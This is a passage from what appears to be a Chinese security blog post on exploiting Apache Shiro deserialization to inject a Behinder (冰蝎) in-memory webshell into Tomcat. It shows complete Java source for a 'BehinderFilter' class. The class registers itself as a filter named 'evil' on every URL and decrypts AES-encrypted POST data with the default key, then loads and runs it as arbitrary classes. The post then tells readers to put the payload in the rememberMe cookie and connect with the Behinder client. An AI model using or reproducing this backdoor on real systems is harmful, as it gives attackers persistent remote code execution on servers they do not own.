javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import javax.servlet.http.HttpSession;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class BehinderFilter extends AbstractTranslet implements Filter &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            final String name = &quot;evil&quot;;</span><br><span class="line">            final String URLPattern = &quot;/*&quot;;</span><br><span class="line"></span><br><span class="line">            WebappClassLoaderBase webappClassLoaderBase =</span><br><span class="line">                    (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line"></span><br><span class="line">            Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);</span><br><span class="line">            Configs.setAccessible(true);</span><br><span class="line">            Map filterConfigs = (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">            BehinderFilter behinderFilter = new BehinderFilter();</span><br><span class="line"></span><br><span class="line">            FilterDef filterDef = new FilterDef();</span><br><span class="line">            filterDef.setFilter(behinderFilter);</span><br><span class="line">            filterDef.setFilterName(name);</span><br><span class="line">            filterDef.setFilterClass(behinderFilter.getClass().getName());</span><br><span class="line">            /**</span><br><span class="line">             * 将filterDef添加到filterDefs中</span><br><span class="line">             */</span><br><span class="line">            standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">            FilterMap filterMap = new FilterMap();</span><br><span class="line">            filterMap.addURLPattern(URLPattern);</span><br><span class="line">            filterMap.setFilterName(name);</span><br><span class="line">            filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">            standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">            constructor.setAccessible(true);</span><br><span class="line">            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">            filterConfigs.put(name, filterConfig);</span><br><span class="line">        &#125; catch (NoSuchFieldException ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125; catch (InvocationTargetException ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125; catch (IllegalAccessException ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125; catch (NoSuchMethodException ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125; catch (InstantiationException ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            System.out.println(&quot;Do Filter ......&quot;);</span><br><span class="line">            // 获取request和response对象</span><br><span class="line">            HttpServletRequest request = (HttpServletRequest) servletRequest;</span><br><span class="line">            HttpServletResponse response = (HttpServletResponse)servletResponse;</span><br><span class="line">            HttpSession session = request.getSession();</span><br><span class="line"></span><br><span class="line">            //create pageContext</span><br><span class="line">            HashMap pageContext = new HashMap();</span><br><span class="line">            pageContext.put(&quot;request&quot;,request);</span><br><span class="line">            pageContext.put(&quot;response&quot;,response);</span><br><span class="line">            pageContext.put(&quot;session&quot;,session);</span><br><span class="line"></span><br><span class="line">            if (request.getMethod().equals(&quot;POST&quot;)) &#123;</span><br><span class="line">                String k = &quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span><br><span class="line">                session.putValue(&quot;u&quot;, k);</span><br><span class="line">                Cipher c = Cipher.getInstance(&quot;AES&quot;);</span><br><span class="line">                c.init(2, new SecretKeySpec(k.getBytes(), &quot;AES&quot;));</span><br><span class="line"></span><br><span class="line">                //revision BehinderFilter</span><br><span class="line">                Method method = Class.forName(&quot;java.lang.ClassLoader&quot;).getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class);</span><br><span class="line">                method.setAccessible(true);</span><br><span class="line">                byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));</span><br><span class="line">                Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte,0, evilclass_byte.length);</span><br><span class="line">                evilclass.newInstance().equals(pageContext);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        System.out.println(&quot;doFilter&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>之后生成字符放到rememberMe后面，之后就可以使用冰蝎进行连接了</p>
+<p><img src="/2022/05/26/Shiro%E5%9B%9E%E6%98%BE%E4%B8%8E%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC/image-20220526214938778.png" alt="image-20220526214938778"></p>
+<p>冰蝎连接</p>
+<p><img src="/2022/05/26/Shiro%E5%9B%9E%E6%98%BE%E4%B8%8E%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC/image-20220526215001292.png" alt="image-20220526215001292"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/05/19/%E9%87%8D%E5%86%993%E7%8E%AFAPI-syscall/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2022-05-26 21:56:41
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="Tags"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/java/" title="java">
+                        <b>#</b> java
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Shiro%E5%9B%9E%E6%98%BE%E4%B8%8E%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">Shiro回显与冰蝎内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E7%AE%80%E4%BB%8B"><span class="toc-text">shiro反序列化原理简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">注入内存马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">注入冰蝎内存马</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2022 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Shiro%E5%9B%9E%E6%98%BE%E4%B8%8E%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC + '&url=' + https%3A%2F%2Flik-ing.github.io%2F2022%2F05%2F26%2FShiro%25E5%259B%259E%25E6%2598%25BE%25E4%25B8%258E%25E5%2586%25B0%25E8%259D%258E%25E5%2586%2585%25E5%25AD%2598%25E9%25A9%25AC%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://lik-ing.github.io/2022/05/26/Shiro%E5%9B%9E%E6%98%BE%E4%B8%8E%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
